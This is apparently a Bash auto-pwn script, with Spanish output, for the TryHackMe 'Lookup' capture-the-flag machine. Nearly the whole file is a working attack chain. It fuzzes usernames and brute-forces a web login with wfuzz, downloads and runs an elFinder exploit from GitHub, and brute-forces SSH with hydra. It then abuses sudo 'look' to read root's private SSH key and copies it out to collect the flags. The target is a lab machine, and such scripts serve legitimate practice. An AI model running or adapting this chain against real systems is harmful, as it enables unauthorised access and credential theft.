#!/bin/bash



dominio="lookup.thm"
subdominio="files.lookup.thm"
etchosts="/tmp/hostsbak"

echo -e "[+] Verificando herramientas instaladas...\n"
sleep 2

python2=$(which python2)
exit_py2=$?

hydr=$(which hydra)
exit_hy=$?

sssh=$(which ssh)
exit_ssh=$?

wfuz=$(which wfuzz)
exit_wfuz=$?

wgt=$(which wget)
exit_wget=$?

sshpas=$(which sshpass)
exit_sshpass=$?

sscp=$(which scp)
exit_scp=$?

if [ "$exit_scp" = 0 ];then
        echo "[+] Python2 instalado $sscp"

else
        echo "scp no encontrado."
fi


if [ "$exit_sshpass" = 0 ];then
        echo "[+] sshpass instalado $sshpas"

else
        echo "sshpass no encontrado."
fi


if [ "$exit_wget" = 0 ];then
        echo "[+] wget instalado $wgt"

else
        echo "wget no encontrado."
fi


if [ "$exit_py2" = 0 ];then
	echo "[+] Python2 instalado $python2"

else
	echo "Python2 no encontrado."
fi


if [ "$exit_hy" = 0 ];then
        echo "[+] Hydra instalado $hydr"

else
        echo "Hydra no encontrado."
fi


if [ "$exit_ssh" = 0 ];then
        echo "[+] ssh instalado $sssh"

else
        echo "ssh no encontrado."
fi


if [ "$exit_wfuz" = 0 ];then
        echo "[+] wfuzz instalado $wfuz"

else
        echo "wfuzz no encontrado."
fi


read -p "Ingresa la ip: " ip

cp /etc/hosts "$etchosts"

echo "$ip $dominio $subdominio" >> /etc/hosts


echo -e "[+] Buscando usuarios: \n"

sudo wfuzz --hw=10 -c -t 100 -w /usr/share/SecLists/Usernames/Names/names.txt -H "Cookie: login_status=success"  -f file.txt -d "username=FUZZ&password=nose" http://lookup.thm/login.php 1>/dev/null

cat file.txt | grep -i ch| awk 'NR>1{print "Usuario: "$NF " encontrado"}'| tr -d '"' && rm file.txt

echo -e "\n[+] Probando credenciales... \n"

sudo wfuzz --hc=200 -t 100 -c -w /usr/share/wordlists/fasttrack.txt -f session.txt -H "Cookie: login_status=success" -d "username=jose&password=FUZZ" http://lookup.thm/login.php 1>/dev/null
cat session.txt | grep -i 302 | awk '{print "Password encontrada para jose: "$NF}'| tr -d '"' && rm session.txt

echo -e "\nExploit para el finder encontrado"
echo "Descargando y ejecutando..."

wget -q https://raw.githubusercontent.com/shosdoo/AutoPwn_lookupTHM/refs/heads/main/SecSignal.jpg -O SecSignal.jpg
wget -q https://raw.githubusercontent.com/shosdoo/AutoPwn_lookupTHM/refs/heads/main/elfinder.py -O elfinder.py

python2 elfinder.py http://files.lookup.thm/elFinder | tee output.txt

cat output.txt | grep -v "\[.*\]" > passwords.txt

hydra -l think -P passwords.txt ssh://"$ip" -o password.txt > /dev/null 2>&1

passssh=$(cat password.txt | grep -i login| awk '{print $NF}')

echo -e "\n[+] Password de usuario think encontrada: $passssh"

rm passwords.txt && rm password.txt && rm output.txt && rm SecSignal.jpg && rm elfinder.py

echo -e "\n[+] Conectando por ssh...\n"

lfile="/root/.ssh/id_rsa"

sshpass -p "$passssh" ssh -o StrictHostKeyChecking=no -T think@"$ip" "echo '$passssh' | sudo -S look '' '$lfile' > /tmp/id_rsaroot" > /dev/null 2>&1

sshpass -p "$passssh" scp think@"$ip":/tmp/id_rsaroot .

mv id_rsaroot id_rsa && chmod 600 id_rsa

scp -i id_rsa root@"$ip":/root/root.txt . 1>/dev/null
scp -i id_rsa root@"$ip":/home/think/user.txt . 1>/dev/null

cat user.txt | awk '{print "Flag de user: "$0}'
cat root.txt | awk '{print "Flag de root: " $0}'

dirid=$(pwd)
echo -e "\n[+] Pwned! id_rsa guardado en: $dirid"

rm user.txt && rm root.txt
mv "$etchosts" /etc/hosts
